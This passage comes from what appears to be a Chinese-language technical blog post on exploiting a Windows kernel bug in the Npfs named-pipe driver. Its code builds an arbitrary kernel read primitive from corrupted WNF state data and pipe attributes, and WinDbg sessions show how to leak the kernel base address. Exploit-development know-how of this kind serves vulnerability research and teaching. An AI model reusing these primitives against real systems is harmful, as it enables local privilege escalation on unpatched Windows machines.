class="built_in">strlen</span>(nameBuffer) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwFsControlFile</span>(pipeHandles.writePipe,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;fsControlFileIoStatusBlock,</span><br><span class="line">        <span class="number">0x110038</span>,   </span><br><span class="line">        nameBuffer,</span><br><span class="line">        name_length,</span><br><span class="line">        output,</span><br><span class="line">        size</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwFsControlFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进而构造任意地址读原语：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">arbRead</span><span class="params">(UINT64 addr, PWNF_STATE_NAME state,PVOID pQueryBuffer, PipeHandles pipeHandles, PCHAR output, ULONG size)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> name[PIPENAMELEN] = &#123;</span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">        ((PCHAR)pQueryBuffer)[<span class="number">0xc0</span>]</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ((PUINT64) pQueryBuffer)[<span class="number">0xb0</span> / <span class="number">0x8</span>] = addr;</span><br><span class="line">    <span class="built_in">updateWnfStateData</span>(state, pQueryBuffer, FAKEWNFSIZE);</span><br><span class="line">    <span class="built_in">pipeReadAttribute</span>(pipeHandles, name, output, size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printBuffer</span>(output, size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">UINT64 <span class="title">arbRead64</span><span class="params">(UINT64 addr, PWNF_STATE_NAME state, PVOID pQueryBuffer, PipeHandles pipeHandles)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> output[<span class="number">0x200</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">arbRead</span>(addr, state, pQueryBuffer, pipeHandles, output, <span class="built_in">sizeof</span>(output));</span><br><span class="line">    UINT64 result = ((PUINT64)output)[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] arbRead64 &quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] addr  :  &quot;</span> &lt;&lt; std::hex &lt;&lt; addr &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] value :  &quot;</span> &lt;&lt; std::hex &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="泄露内核地址"><a href="#泄露内核地址" class="headerlink" title="泄露内核地址"></a>泄露内核地址</h2><p>有了任意地址读，我们该读哪里呢？平常情况下如果是中等权限的用户可以直接得到内核基址，但是现在我们假设我们是一个低权限用户，我们可以使用一种方法来泄露出内核基址。我们断在 <code>NpSetAttributeInList</code> 处，那么 <code>rcx</code> 如果是一个正常的 <code>pipe_attribute</code> 结构体指针，它就和当前<code>irp</code> 请求的 <code>file_object-&gt;FsContext2</code> 中的这个字段存在一定关系，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">Npfs!NpSetAttributeInList:</span><br><span class="line">fffff805`<span class="number">86</span>a151c0 <span class="number">48895</span>c2408      mov     qword ptr [rsp+<span class="number">8</span>],rbx</span><br><span class="line"><span class="number">1</span>: kd&gt; r</span><br><span class="line">rax=<span class="number">000000000000005</span>e rbx=ffff9f0844c4cb70 rcx=ffff9f0844c4cc70</span><br><span class="line">rdx=<span class="number">0000000000000000</span> rsi=ffffc58e022b8010 rdi=<span class="number">0000000000000002</span></span><br><span class="line">rip=fffff80586a151c0 rsp=ffffd58efb43e5e8 rbp=ffff9f0844c4cc70</span><br><span class="line"> r8=ffffc58e022b8010  r9=ffffc58e022b801a r10=fffff8058342f440</span><br><span class="line">r11=ffffd58efb43e6a8 r12=ffffc58e0281bc60 r13=ffffc58e04e77310</span><br><span class="line">r14=ffff9f0843c88960 r15=ffffc58e022b801a</span><br><span class="line">iopl=<span class="number">0</span>         nv up ei pl zr na po nc</span><br><span class="line">cs=<span class="number">0010</span>  ss=<span class="number">0018</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00040246</span></span><br><span class="line">Npfs!NpSetAttributeInList:</span><br><span class="line">fffff805`<span class="number">86</span>a151c0 <span class="number">48895</span>c2408      mov     qword ptr [rsp+<span class="number">8</span>],rbx ss:<span class="number">0018</span>:ffffd58e`fb43e5f0=ffff9f0844c4cb70</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; !pool @rcx</span><br><span class="line">Pool page ffff9f0844c4cc70 region is Paged pool</span><br><span class="line"> ffff9f0844c4c1c0 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0844c4c3a0 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0844c4c580 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0844c4c760 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0844c4c940 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line">*ffff9f0844c4cb20 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated) *NpFc Process: ffffc58e033b84c0</span><br><span class="line">		Pooltag NpFc : CCB, client control block, Binary : npfs.sys</span><br><span class="line"> ffff9f0844c4cd00 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; !thread</span><br><span class="line">THREAD ffffc58e01808080  Cid <span class="number">10</span>dc<span class="number">.05f</span>8  Teb: <span class="number">000000000021</span>a000 Win32Thread: <span class="number">0000000000000000</span> RUNNING on processor <span class="number">1</span></span><br><span class="line">IRP List:</span><br><span class="line">    ffffc58e0281bc60: (<span class="number">0006</span>,<span class="number">0358</span>) Flags: <span class="number">00060870</span>  Mdl: <span class="number">00000000</span>  <span class="comment">// IRP指针</span></span><br><span class="line">Not impersonating</span><br><span class="line">DeviceMap                 ffff9f083f7d4b10</span><br><span class="line">Owning Process            ffffc58e033b84c0       Image:         poc.exe</span><br><span class="line">Attached Process          N/A            Image:         N/A</span><br><span class="line">Wait Start TickCount      <span class="number">478578</span>         Ticks: <span class="number">1</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00.015</span>)</span><br><span class="line">Context Switch Count      <span class="number">244</span>            IdealProcessor: <span class="number">0</span>             </span><br><span class="line">UserTime                  <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.343</span></span><br><span class="line">KernelTime                <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.546</span></span><br><span class="line">Win32 Start Address <span class="number">0x0000000000b02344</span></span><br><span class="line">Stack Init ffffd58efb43ec90 Current ffffd58efb43e550</span><br><span class="line">Base ffffd58efb43f000 Limit ffffd58efb439000 Call <span class="number">0000000000000000</span></span><br><span class="line">Priority <span class="number">8</span> BasePriority <span class="number">8</span> PriorityDecrement <span class="number">0</span> IoPriority <span class="number">2</span> PagePriority <span class="number">5</span></span><br><span class="line">Child-SP          RetAddr               : Args to Child                                                           : Call Site</span><br><span class="line">ffffd58e`fb43e5e8 fffff805`<span class="number">86</span>a15161     : ffff9f08`<span class="number">44</span>c4cb70 <span class="number">00000000</span>`<span class="number">00000000</span> ffff9300`<span class="number">00000001</span> ffffc58e`<span class="number">022b</span>8010 : Npfs!NpSetAttributeInList</span><br><span class="line">ffffd58e`fb43e5f0 fffff805`<span class="number">86</span>a0cf6a     : ffff9f08`<span class="number">43</span>c88960 ffffc58d`ff133060 <span class="number">00000000</span>`<span class="number">0000005</span>e <span class="number">00000000</span>`<span class="number">00000000</span> : Npfs!NpSetAttribute+<span class="number">0x231</span></span><br><span class="line">ffffd58e`fb43e660 fffff805`<span class="number">86</span>a0cb77     : ffffc58e`<span class="number">04e77310</span> ffffc58d`ff133060 ffffc58e`<span class="number">0281b</span>c60 ffffc58e`<span class="number">0281b</span>d78 : Npfs!NpCommonFileSystemControl+<span class="number">0x3aa</span></span><br><span class="line">ffffd58e`fb43e6b0 fffff805`<span class="number">83427</span>da9     : ffffc58e`<span class="number">02189050</span> fffff805`<span class="number">84b</span>145a0 ffffd58e`fb43e7c0 <span class="number">00000000</span>`<span class="number">00000000</span> : Npfs!NpFsdFileSystemControl+<span class="number">0x27</span></span><br><span class="line">ffffd58e`fb43e6e0 fffff805`<span class="number">84b</span>155de     : <span class="number">00000000</span>`<span class="number">00000000</span> ffffd58e`fb43e7c0 ffffc58e`<span class="number">0281b</span>c60 ffffd58e`fb43e7d0 : nt!IofCallDriver+<span class="number">0x59</span></span><br><span class="line">ffffd58e`fb43e720 fffff805`<span class="number">84b</span>4c190     : ffffd58e`fb43e7c0 <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000001</span> <span class="number">00000000</span>`<span class="number">00000000</span> : FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+<span class="number">0x15e</span></span><br><span class="line">ffffd58e`fb43e7a0 fffff805`<span class="number">83427</span>da9     : ffffc58e`<span class="number">0281b</span>c60 <span class="number">00000000</span>`<span class="number">00000002</span> <span class="number">00000000</span>`<span class="number">00000001</span> <span class="number">00000000</span>`<span class="number">00000208</span> : FLTMGR!FltpFsControl+<span class="number">0x110</span></span><br><span class="line">ffffd58e`fb43e800 fffff805`<span class="number">83</span>a15dd5     : ffffd58e`fb43eb80 ffffc58e`<span class="number">0281b</span>c60 <span class="number">00000000</span>`<span class="number">00000001</span> ffffc58e`<span class="number">04e77310</span> : nt!IofCallDriver+<span class="number">0x59</span></span><br><span class="line">ffffd58e`fb43e840 fffff805`<span class="number">83</span>a1572a     : ffffc58e`<span class="number">0281b</span>c60 ffffd58e`fb43eb80 <span class="number">00000000</span>`<span class="number">0011003</span>c ffffd58e`fb43eb80 : nt!IopSynchronousServiceTail+<span class="number">0x1a5</span></span><br><span class="line">ffffd58e`fb43e8e0 fffff805`<span class="number">83</span>ab8216     : <span class="number">00000000</span>`<span class="number">001e0000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> : nt!IopXxxControlFile+<span class="number">0x5ca</span></span><br><span class="line">ffffd58e`fb43ea20 fffff805`<span class="number">835</span>cde95     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">0012</span>df98 : nt!NtFsControlFile+<span class="number">0x56</span></span><br><span class="line">ffffd58e`fb43ea90 <span class="number">00000000</span>`<span class="number">774f</span>1cbc     : <span class="number">00000000</span>`<span class="number">774f</span>18f3 <span class="number">00000023</span>`<span class="number">77571</span>dfc <span class="number">00007f</span>fb`eaeb0023 <span class="number">00000000</span>`<span class="number">00000000</span> : nt!KiSystemServiceCopyEnd+<span class="number">0x25</span> (TrapFrame @ ffffd58e`fb43eb00)</span><br><span class="line"><span class="number">00000000</span>`<span class="number">0012e8</span>e8 <span class="number">00000000</span>`<span class="number">774f</span>18f3     : <span class="number">00000023</span>`<span class="number">77571</span>dfc <span class="number">00007f</span>fb`eaeb0023 <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">004f</span>fb00 : <span class="number">0x774f1cbc</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">0012e8</span>f0 <span class="number">00000023</span>`<span class="number">77571</span>dfc     : <span class="number">00007f</span>fb`eaeb0023 <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">004f</span>fb00 <span class="number">00000000</span>`<span class="number">0012e940</span> : <span class="number">0x774f18f3</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">0012e8</span>f8 <span class="number">00007f</span>fb`eaeb0023     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">004f</span>fb00 <span class="number">00000000</span>`<span class="number">0012e940</span> <span class="number">00000000</span>`<span class="number">0011003</span>c : <span class="number">0x00000023</span>`<span class="number">77571</span>dfc</span><br><span class="line"><span class="number">00000000</span>`<span class="number">0012e900</span> <span class="number">00000000</span>`<span class="number">00000000</span>     : <span class="number">00000000</span>`<span class="number">004f</span>fb00 <span class="number">00000000</span>`<span class="number">0012e940</span> <span class="number">00000000</span>`<span class="number">0011003</span>c <span class="number">00000000</span>`<span class="number">001e0000</span> : <span class="number">0x00007ffb</span>`eaeb0023</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; !irp ffffc58e0281bc60 <span class="comment">// 查看irp信息</span></span><br><span class="line">Irp is active with <span class="number">2</span> stacks <span class="number">1</span> is <span class="built_in">current</span> (= <span class="number">0xffffc58e0281bd30</span>)</span><br><span class="line"> No Mdl: System buffer=ffffc58e022b8010: Thread ffffc58e01808080:  Irp stack trace.  </span><br><span class="line">     cmd  flg cl Device   File     Completion-Context</span><br><span class="line">&gt;[<span class="built_in">IRP_MJ_FILE_SYSTEM_CONTROL</span>(d), N/<span class="built_in">A</span>(<span class="number">0</span>)]</span><br><span class="line">            <span class="number">4</span> e0 ffffc58dff133060 ffffc58e04e77310 fffff80584b130a0-ffffc58e02189050 Success Error Cancel </span><br><span class="line">	       \FileSystem\Npfs	FLTMGR!FltpPassThroughCompletion</span><br><span class="line">			Args: <span class="number">00000200</span> <span class="number">00000068</span> <span class="number">0011003</span>c <span class="number">00000000</span></span><br><span class="line"> [<span class="built_in">IRP_MJ_FILE_SYSTEM_CONTROL</span>(d), N/<span class="built_in">A</span>(<span class="number">0</span>)]</span><br><span class="line">            <span class="number">4</span>  <span class="number">1</span> ffffc58dffc08b50 ffffc58e04e77310 <span class="number">00000000</span><span class="number">-00000000</span>    pending</span><br><span class="line">	       \FileSystem\FltMgr</span><br><span class="line">			Args: <span class="number">00000200</span> <span class="number">00000068</span> <span class="number">0011003</span>c <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; dt nt!_file_object ffffc58e04e77310 <span class="comment">// 查看file_object </span></span><br><span class="line">   +<span class="number">0x000</span> Type             : <span class="number">0</span>n5</span><br><span class="line">   +<span class="number">0x002</span> Size             : <span class="number">0</span>n216</span><br><span class="line">   +<span class="number">0x008</span> DeviceObject     : <span class="number">0xffffc58d</span>`ff133060 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x010</span> Vpb              : (null) </span><br><span class="line">   +<span class="number">0x018</span> FsContext        : <span class="number">0xffff9f08</span>`<span class="number">43</span>c88960 Void</span><br><span class="line">   +<span class="number">0x020</span> FsContext2       : <span class="number">0xffff9f08</span>`<span class="number">44</span>c4cb31 Void</span><br><span class="line">   +<span class="number">0x028</span> SectionObjectPointer : (null) </span><br><span class="line">   +<span class="number">0x030</span> PrivateCacheMap  : <span class="number">0x00000000</span>`<span class="number">00000001</span> Void</span><br><span class="line">   +<span class="number">0x038</span> FinalStatus      : <span class="number">0</span>n0</span><br><span class="line">   +<span class="number">0x040</span> RelatedFileObject : <span class="number">0xffffc58e</span>`<span class="number">01f</span>67d80 _FILE_OBJECT</span><br><span class="line">   +<span class="number">0x048</span> LockOperation    : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x049 DeletePending    : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04a</span> ReadAccess       : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04b WriteAccess      : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04c</span> DeleteAccess     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04d SharedRead       : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04e</span> SharedWrite      : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04f SharedDelete     : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x050</span> Flags            : <span class="number">0x40082</span></span><br><span class="line">   +<span class="number">0x058</span> FileName         : _UNICODE_STRING <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> CurrentByteOffset : _LARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x070</span> Waiters          : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x074</span> Busy             : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x078</span> LastLock         : (null) </span><br><span class="line">   +<span class="number">0x080</span> Lock             : _KEVENT</span><br><span class="line">   +<span class="number">0x098</span> Event            : _KEVENT</span><br><span class="line">   +<span class="number">0x0b0</span> CompletionContext : (null) </span><br><span class="line">   +<span class="number">0x0b8</span> IrpListLock      : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> IrpList          : _LIST_ENTRY [ <span class="number">0xffffc58e</span>`<span class="number">04e773</span>d0 - <span class="number">0xffffc58e</span>`<span class="number">04e773</span>d0 ]</span><br><span class="line">   +<span class="number">0x0d0</span> FileObjectExtension : (null) </span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; ?rcx<span class="number">-0xffff9f08</span>`<span class="number">44</span>c4cb31 <span class="comment">// 固定的偏移</span></span><br><span class="line">Evaluate expression: <span class="number">319</span> = <span class="number">00000000</span>`<span class="number">0000013f</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; dq <span class="number">0xffff9f08</span>`<span class="number">44</span>c4cb31<span class="number">-1</span></span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb30  <span class="number">00000002</span>`<span class="number">00000204</span> <span class="number">0000000</span>c`<span class="number">00000003</span></span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb40  <span class="number">00000101</span>`<span class="number">00000002</span> ffff9f08`<span class="number">43</span>c88a68</span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb50  ffff9f08`<span class="number">43</span>c88a68 ffff9f08`<span class="number">43</span>c88960</span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb60  ffffc58e`<span class="number">04e77310</span> ffffc58e`<span class="number">01f</span>67d80 <span class="comment">// file_object的指针</span></span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb70  <span class="number">00000000</span>`<span class="number">00000001</span> ffff9f08`<span class="number">44</span>c4cb78</span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb80  ffff9f08`<span class="number">44</span>c4cb78 <span class="number">00000000</span>`<span class="number">00000002</span></span><br><span class="line">ffff9f08`<span class="number">44</span>c4cb90  <span class="number">00001000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffff9f08`<span class="number">44</span>c4cba0  ffff9f08`<span class="number">44</span>c4cba9 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>而这个特殊的 <code>pipe_attribute</code>  就在 <code>list_entry</code> 的链表中，可以通过遍历 <code>fd</code> 指针找到它：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffffc58dfda7d380 -<span class="built_in">r1</span> ((ntkrnlmp!_LIST_ENTRY *)<span class="number">0xffff9f084dd8cad0</span>)</span><br><span class="line">((ntkrnlmp!_LIST_ENTRY *)<span class="number">0xffff9f084dd8cad0</span>)                 : <span class="number">0xffff9f084dd8cad0</span> [Type: _LIST_ENTRY *]</span><br><span class="line">    [+<span class="number">0x000</span>] Flink            : <span class="number">0xffff9f084dd8b9f0</span> [Type: _LIST_ENTRY *]</span><br><span class="line">    [+<span class="number">0x008</span>] Blink            : <span class="number">0xffff9f084dd8c030</span> [Type: _LIST_ENTRY *]</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffffc58dfda7d380 -<span class="built_in">r1</span> ((ntkrnlmp!_LIST_ENTRY *)<span class="number">0xffff9f084dd8b9f0</span>)</span><br><span class="line">((ntkrnlmp!_LIST_ENTRY *)<span class="number">0xffff9f084dd8b9f0</span>)                 : <span class="number">0xffff9f084dd8b9f0</span> [Type: _LIST_ENTRY *]</span><br><span class="line">    [+<span class="number">0x000</span>] Flink            : <span class="number">0xffff9f0841dc8670</span> [Type: _LIST_ENTRY *]</span><br><span class="line">    [+<span class="number">0x008</span>] Blink            : <span class="number">0xffff9f084dd8cad0</span> [Type: _LIST_ENTRY *]</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; !pool <span class="number">0xffff9f0841dc8670</span></span><br><span class="line">Pool page ffff9f0841dc8670 region is Paged pool</span><br><span class="line"> ffff9f0841dc8160 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0841dc8340 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line">*ffff9f0841dc8520 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated) *NpFc Process: ffffc58e04d0d4c0</span><br><span class="line">		Pooltag NpFc : CCB, client control block, Binary : npfs.sys</span><br><span class="line"> ffff9f0841dc8700 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Free)       FMfn</span><br><span class="line"> ffff9f0841dc88e0 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br><span class="line"> ffff9f0841dc8ac0 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  NpFc Process: ffffc58e024a62c0</span><br><span class="line"> ffff9f0841dc8ca0 size:  <span class="number">1e0</span> previous size:    <span class="number">0</span>  (Allocated)  FMfn</span><br></pre></td></tr></table></figure>

<p>它的大小和我们所堆喷的块大小和 <code>tag</code> 都不一致，所以可以通过检查其 <code>size</code> 或 <code>tag</code> 来判断是否为该特殊块。然后通过 <code>file_object → DeviceObject → DriverObject → DeviceObject → ntkrnlmp!IopInvalidDeviceRequest</code> 来得到 <code>IopInvalidDeviceRequest</code> 的地址，然后减去 <code>IopInvalidDeviceRequest</code> 在 <code>ntoskrnl.exe</code> 中的偏移就是内核基址了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 